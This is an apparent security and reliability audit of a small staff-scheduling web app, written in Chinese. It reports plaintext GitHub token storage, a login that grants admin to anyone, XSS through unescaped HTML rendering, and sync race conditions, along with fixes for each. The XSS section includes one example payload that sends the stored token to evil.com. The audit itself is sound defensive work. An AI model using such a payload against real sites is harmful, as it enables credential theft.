# 安福路 Salomon 兼职管理系统 — 对抗式安全与可靠性审计

> 审计日期：2026-07-07  
> 审计版本：v47e  
> 审计人：Senior Developer  
> 审计范围：`js/sync.js`、`js/app.js`、`js/pages.js`、`index.html`、`login.html`、`app.html`、`data/` 目录

---

## 📊 审计总览

| 严重等级 | 数量 | 说明 |
|---------|------|------|
| 🔴 P0 致命 | **3** | 必须立即修复，存在数据泄露或安全风险 |
| 🟠 P1 严重 | **6** | 高概率触发数据错误或功能故障 |
| 🟡 P2 中等 | **8** | 影响系统可维护性和用户体验 |
| 🟢 P3 建议 | **5** | 优化建议，非紧急 |

---

## 🔴 P0 致命问题（必须立即修复）

### P0-1: GitHub Token 明文存储于 localStorage，任何人可提取

**文件**: `js/sync.js` L42, L49; `login.html` L277

**问题**: Token 存储在 `localStorage.gh_sync_token`，任何能打开浏览器开发者工具的人（或任何注入到页面的第三方脚本）都能直接读取：

```javascript
getToken() {
  return localStorage.getItem('gh_sync_token') || null;  // 明文！
}
```

**风险**: 
- 兼职人员共用电脑时，一人可提取另一人的 Token
- 该 Token 拥有 repo 完整写入权限，泄露后可篡改/删除整个仓库
- Token 在 `login.html` L252 中还被回填到 `<input>` 的 `value` 属性，DOM 中可见

**修复建议**:
- 短期：改用 Fine-grained Token，仅授权 `Contents: Read and Write`，限制到单一仓库
- 中期：Token 不回填到输入框（`login.html` L252 删掉 `value=token`），仅显示"已配置"状态
- 长期：引入轻量后端代理（如 Cloudflare Worker），Token 存服务端，前端只发数据不持 Token

---

### P0-2: 认证形同虚设 — 无密码、无身份验证

**文件**: `login.html` L230-238

**问题**: "进入系统"按钮直接写入 `sessionStorage`，任何人都能登录：

```javascript
function doLogin() {
  sessionStorage.setItem('auth', JSON.stringify({
    role: 'admin',    // 直接给 admin 权限！
    staffId: null,
    staffName: null,
    loginTime: Date.now()
  }));
  window.location.href = 'index.html';
}
```

`index.html` L168 的 `if (!Auth.init()) throw new Error('Not authenticated')` 只检查 sessionStorage 是否存在，不验证任何凭据。

**风险**:
- 任何知道 URL 的人都能进入系统，查看/修改所有兼职数据
- GitHub Pages 是公开部署，URL 可被搜索引擎索引
- 没有操作审计——谁改了什么数据完全无法追溯

**修复建议**:
- 短期：加一个共享密码门槛（`prompt()` 或简单密码输入框），至少阻挡随机访问
- 中期：基于 staff 列表的身份选择 + 个人密码（每人不同）
- 长期：接入 GitHub OAuth，只有仓库 collaborator 才能进入

---

### P0-3: XSS 漏洞 — 用户输入直接拼入 HTML，无转义

**文件**: `js/pages.js` 多处

**问题**: 所有渲染函数（`renderSchedule`、`renderMyForms`、`renderCustomerReviews`、`renderSupport` 等）都使用模板字符串直接拼接用户数据到 innerHTML，未做 HTML 转义。

**攻击路径示例**:
```javascript
// 某人在"不可上班备注"里输入：
<img src=x onerror="fetch('https://evil.com/steal?token='+localStorage.gh_sync_token)">

// saveDateStatus() 存入 dates[dateKey].note
// renderSchedule() 渲染时：
${noteDisplay ? `<div>${noteDisplay}</div>` : ''}  // 直接执行！
```

**受影响的输入点**（至少）:
- `saveDateStatus()` → `note` 字段 → 渲染在排班表格和备注列
- `saveSupport()` → `detail` 字段 → 渲染在支援记录表格
- `saveShift()` → `applicantShift`/`receiverShift` → 渲染在换班记录
- `saveDoorSlotInline()` → `staffName` → 渲染在门迎排班
- `saveReview()` → 评价原文 → 渲染在顾客好评
- `saveRating()` → `comment` → 渲染在评分卡片

**风险**: 恶意兼职人员可注入脚本窃取其他人的 GitHub Token、篡改评分数据、甚至删除整个云端数据文件。

**修复建议**: 添加全局 HTML 转义函数，所有用户输入渲染前必须转义：
```javascript
function esc(str) {
  const d = document.createElement('div');
  d.textContent = String(str ?? '');
  return d.innerHTML;
}
// 使用：${esc(noteDisplay)}
```

---

## 🟠 P1 严重问题

### P1-1: ID 生成存在竞态条件 — 多人同时新增会产生重复 ID

**文件**: `js/pages.js` L4124, L4224, L2277 等

**问题**:
```javascript
const newId = data.length > 0 ? Math.max(...data.map(s => s.id)) + 1 : 1;
data.push({ id: newId, ... });
```

如果两人同时新增支援记录/换班记录，各自本地算出的 `newId` 相同。同步后 `_mergeArraysById` 会把两条记录当作同一条合并，**导致数据丢失**。

**修复建议**: 使用 `Date.now() + 随机后缀` 或 UUID 替代自增 ID：
```javascript
const newId = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
```

---

### P1-2: GitHub API 速率限制风险 — 15秒轮询 + 多人 = 超限

**文件**: `js/sync.js` L872-876

**问题**: 每 15 秒自动 pull 一次。GitHub API 认证用户限制 5000 次/小时。

**场景计算**:
- 19 名兼职 + 管理员 = 20 个设备
- 每设备每 15 秒 1 次 pull = 4 次/分钟 = 240 次/小时
- 20 设备 × 240 = **4800 次/小时**（几乎触顶）
- 加上每次填报触发的 push（3 轮重试 × 2 次 fetch = 最多 6 次/操作）
- 高峰期极易超限，超限后所有同步停止 1 小时

**修复建议**:
- 将 PULL_INTERVAL 从 15 秒调回 30-60 秒（15 秒对兼职系统过于激进）
- 使用 `visibilitychange` 事件：页面不可见时暂停轮询
- 添加 403 响应处理：遇到 `X-RateLimit-Remaining: 0` 时暂停轮询并提示用户

---

### P1-3: `_mergeFields` 无时间戳时的合并逻辑有歧义

**文件**: `js/sync.js` L820-838

**问题**: 当双方都没有 `_updatedAt`（都为 0）时：
```javascript
const remoteNewer = rTs >= lTs;  // 0 >= 0 = true → remote 优先
```

这意味着：两人同时编辑同一条记录的不同字段（都无时间戳），"remote" 一方的非空字段总是覆盖 "local"。但谁是 remote 取决于调用顺序，**结果不确定**。

当前大部分旧数据（shiftChanges、storeSupport 等）都没有 `_updatedAt`，所以每次同步都是"最后推送者赢"。

**修复建议**: 为所有 CRUD 操作（saveSupport、saveShift、saveRating 等）添加 `_updatedAt: String(Date.now())`，与 saveDoorSlotInline 保持一致。

---

### P1-4: submissions.json 无限增长 — 已 430KB 且无清理机制

**文件**: `data/submissions.json`（当前 430KB）

**问题**: 每次同步都是"拉取→合并→推送完整数据"。数据只增不减：
- 已离职人员的历史数据永久保留
- 过去月份的排班/考勤/支援记录永不清理
- `availability.months` 按月增长
- `doorSchedule` 按天增长

GitHub API 对大文件响应慢，且 100MB 是硬上限。按当前增速，半年内可能达到数 MB，每次同步耗时数秒。

**修复建议**:
- 添加"归档"功能：3 个月以前的数据移入 `data/archive/` 目录
- push 前过滤掉已离职人员（`status === 'inactive'`）的非必要数据
- 定期手动清理（数据管理页面加"瘦身"按钮）

---

### P1-5: `confirm()` 在移动端体验差且可能被禁用

**文件**: `js/pages.js` L5077, L4135, L4226 等

**问题**: 所有删除操作都用 `if (!confirm('...')) return;`。在移动端浏览器（尤其 iOS Safari 内嵌 WebView）中，`confirm()` 可能被禁用或样式糟糕，导致用户无法确认删除。

**修复建议**: 替换为自定义确认对话框（与现有 DoorSlotForm 风格一致）。

---

### P1-6: 多标签页同时打开时的 LocalStorage 竞态

**问题**: 用户在两个标签页同时打开系统，两个标签页各自维护 `Store._cache` 内存缓存。标签页 A 修改数据后写入 localStorage，标签页 B 的 `_cache` 还是旧数据。当标签页 B 的 15 秒 pull 触发时，会用旧 cache 做合并，可能覆盖标签页 A 的修改。

`Store._cache` 在 `set()` 时更新当前实例，但其他标签页的 `_cache` 不会更新。没有 `storage` 事件监听来同步缓存。

**修复建议**:
```javascript
window.addEventListener('storage', (e) => {
  if (e.key === Store.KEY) Store._cache = null;  // 失效缓存
});
```

---

## 🟡 P2 中等问题

### P2-1: `.bak` 文件残留于仓库

**文件**: `js/app.js.bak.1781662965`、`js/pages.js.bak.1781662965`、`js/app.js.bak.1781664444`、`js/pages.js.bak.1781664444`

这些备份文件被提交到仓库，增加仓库体积且混淆文件结构。应删除并加入 `.gitignore`。

---

### P2-2: `document.execCommand('copy')` 已废弃

**文件**: `js/sync.js` L635

```javascript
document.execCommand('copy');  // Deprecated
```

现代浏览器已逐步移除支持。应改用 `navigator.clipboard.writeText()`。

---

### P2-3: Store.init 版本升级时的数据清洗风险

**文件**: `js/app.js` L1617-1634

`_isCorrupt` 函数用正则 `/[\u00c0-\u00ff]{2,}/` 检测乱码，但**合法的欧洲语言字符（如法语、德语）也在这个范围**。如果兼职人员的备注中包含合法的特殊字符（如 "café"），会被误判为乱码而删除。

**修复建议**: 收紧检测条件——要求乱码字符占比 > 50% 才判定，而非仅出现连续 2 个。

---

### P2-4: `storeSupport` duration 解析过于脆弱

**文件**: `js/pages.js` L1661

```javascript
const m = (r.duration || '').match(/([\d.]+)\s*小时/);
```

如果用户输入 "2小时30分钟"、"2.5h"、"90分钟" 等格式，都无法正确解析。评分系统的"行为规范"维度依赖这个时长数据，解析失败会导致评分偏差。

---

### P2-5: `_behaviorCache` 全局变量缓存可能过期

**文件**: `js/pages.js` L1635

`_behaviorCache` 在 `renderRatings()` 开头被清空，但如果其他函数（如 Dashboard 图表渲染）在 `renderRatings` 之前调用了 `getBehaviorData()`，缓存会被填充且不会被清空，导致后续评分计算使用过期数据。

**修复建议**: 将 `_behaviorCache` 改为函数参数传递，或添加版本号校验。

---

### P2-6: 错误处理不一致 — 部分 catch 吞掉错误

**文件**: `js/sync.js` 多处

```javascript
// L90: 静默吞掉 API 错误详情
const err = await resp.json().catch(() => ({}));

// L130: 双重编码修复的 catch 为空
} catch (e) {}  // 静默失败
```

用户遇到同步错误时只能看到 "推送失败" 的模糊提示，无法定位具体原因。

---

### P2-7: Router 没有路由守卫 — 直接修改 URL 可绕过

**问题**: `Router.navigate(page)` 只设置 `this.current`，不更新 URL hash。但 `renderMyForms()` L4262 检查 `location.hash === '#myforms'`，这个 hash 从未被设置过，所以条件永远为 false，导致 pull 后的重新渲染逻辑可能不触发。

---

### P2-8: 首次配置 Token 后 `push('initial-setup')` 无 await

**文件**: `js/sync.js` L981

```javascript
Sync.push('initial-setup').catch(e => {
  console.warn('[Sync] 初始同步失败:', e.message);
}).finally(() => {
  overlay.remove();
  Sync._updateIndicator();
});
```

`overlay.remove()` 在 push 完成（可能需要 3 轮重试 = 10+ 秒）之前就执行了（finally 在 promise settle 后才执行），但用户看到"正在同步"的 dialog 消失后可能以为已完成，实际 push 可能还在重试中。

---

## 🟢 P3 优化建议

### P3-1: app.js 中硬编码了大量业务数据

`app.js` defaults 中硬编码了 19 名兼职的完整信息、6 个月的门迎排班、6 月的可上班时间等。文件超过 2000 行，每次版本升级都要重新注入所有数据。

**建议**: 将默认数据分离到 `js/data/defaults.js`，app.js 只包含逻辑代码。

### P3-2: 缺少操作日志/审计追踪

系统没有任何操作日志。谁在什么时候修改了什么数据，完全无法追溯。建议在每次 push 时记录 `{ user, action, timestamp, before, after }` 到云端日志文件。

### P3-3: 评分系统对"无数据"成员过于宽容

`calcPerformanceScore` 找不到数据时返回 `{ score: 3 }`（"合格"），这意味着不录入业绩数据的人也能拿到 3 分（及格），而录入数据但表现一般的人可能只拿 2 分。建议无数据时返回更低分数或标记为"未评估"。

### P3-4: 15 秒轮询缺少页面可见性检测

即使浏览器标签页在后台（用户在看其他页面），仍然每 15 秒发送一次 API 请求。应监听 `document.visibilityState`，后台时暂停轮询。

### P3-5: 缺少离线模式提示

网络断开时，`Sync.pull()` 静默失败，用户不知道数据未同步。建议在网络恢复后自动重试并 toast 提示。

---

## 📋 修复优先级建议

| 优先级 | 任务 | 预估工作量 |
|-------|------|-----------|
| **立即** | P0-3: 添加 HTML 转义函数 | 30 分钟 |
| **立即** | P0-2: 添加基础密码门槛 | 20 分钟 |
| **本周** | P1-1: 修复 ID 生成竞态 | 20 分钟 |
| **本周** | P1-2: 调整轮询频率 + 可见性检测 | 15 分钟 |
| **本周** | P0-1: Token 不回填输入框 | 5 分钟 |
| **本周** | P1-3: 为所有 CRUD 添加时间戳 | 30 分钟 |
| **下周** | P1-6: 添加 storage 事件监听 | 10 分钟 |
| **下周** | P2-1: 清理 .bak 文件 | 5 分钟 |
| **逐步** | P1-4: 数据归档机制 | 2 小时 |

---

## ✅ 做得好的部分

审计中也发现了以下值得肯定的设计：

1. **字段级合并策略**（`_mergeFields` + `_updatedAt`）思路正确，比整体覆盖安全得多
2. **3 轮 SHA 冲突重试** + **`_verifyDataInCloud` 云端验证** 有效解决了 GitHub Contents API 的乐观锁问题
3. **`_pushInFlight` 锁** 正确解决了 push/pull 竞态条件
4. **双重 UTF-8 编码检测修复** 考虑了历史脏数据的兼容性
5. **Store.init 的安全备份** 在版本升级前自动备份，防止升级失败丢数据
6. **评分系统的动态计算** 设计合理——5 个维度都从原始数据实时算，不依赖静态缓存

---

*审计结束。建议按优先级逐项修复，P0 问题应在 24 小时内处理。*
